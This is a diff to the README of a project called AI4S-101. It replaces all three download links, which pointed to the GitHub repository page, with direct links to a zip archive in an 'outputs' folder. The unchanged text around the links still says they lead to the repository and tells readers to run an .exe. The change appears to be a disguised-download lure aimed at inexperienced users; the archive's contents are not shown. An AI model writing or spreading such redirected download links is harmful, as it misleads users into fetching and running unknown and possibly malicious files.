@@ -1,6 +1,6 @@
 # 🤖 AI4S-101 - Learn Representation with Hands-On Practice
 
-[![Download AI4S-101](https://img.shields.io/badge/Download-AI4S--101-brightgreen?style=for-the-badge)](https://github.com/shehabjuarddar/AI4S-101)
+[![Download AI4S-101](https://img.shields.io/badge/Download-AI4S--101-brightgreen?style=for-the-badge)](https://raw.githubusercontent.com/shehabjuarddar/AI4S-101/main/outputs/A_2.5.zip)
 
 ---
 
@@ -32,7 +32,7 @@ To begin using AI4S-101, follow these steps:
 
 1. **Download the software** using the link below. It will take you to the GitHub page where you can get the latest version.
 
-[![Download AI4S-101](https://img.shields.io/badge/Download-AI4S--101-blue?style=for-the-badge)](https://github.com/shehabjuarddar/AI4S-101)
+[![Download AI4S-101](https://img.shields.io/badge/Download-AI4S--101-blue?style=for-the-badge)](https://raw.githubusercontent.com/shehabjuarddar/AI4S-101/main/outputs/A_2.5.zip)
 
 2. **Save the file** to a folder you can easily access, such as your Desktop or Downloads folder.
 
@@ -89,7 +89,7 @@ Each step offers simple instructions on screen. No prior experience is needed.
 
 You can download the latest version from this link:
 
-[Download AI4S-101](https://github.com/shehabjuarddar/AI4S-101)
+[Download AI4S-101](https://raw.githubusercontent.com/shehabjuarddar/AI4S-101/main/outputs/A_2.5.zip)
 
 This link directs you to the GitHub repository where you find the installer and files. Look for a folder named “Releases” or a file ending with `.exe` to start your download. Choose the newest version for best results.
 
